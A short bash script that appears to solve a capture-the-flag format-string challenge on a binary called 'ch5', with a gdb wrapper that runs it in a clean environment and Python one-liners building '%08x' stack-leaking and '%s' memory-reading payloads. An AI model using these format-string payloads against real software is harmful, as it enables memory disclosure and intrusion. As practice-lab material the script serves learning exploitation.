#!/bin/bash

WIP=/tmp/arthour
mkdir $WIP
cd $WIP

INVOKE=$WIP/invoke.sh
cat >$INVOKE <<EOF
#!/bin/sh

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi
EOF

cd -
# find deadbeef
./ch5 $(python -c 'print "\xef\xbe\xad\xbde" + ".%08x"*125 + ".%x"')

# find buffer address
$INVOKE -d  ./ch5 $(python -c 'print "\xef\xbe\xad\xbde" + ".%08x"*125 + ".%x"')
# unset env LINES
# unset env COLUMNS
# break  0x8048531 (fgets)
# run
# x $esp

# replace deadbeef with address of buffer and 125 with the correct count
$INVOKE ./ch5 $(python -c 'print "\xef\xbe\xad\xbde" + ".%08x"*125 + ".%s"')
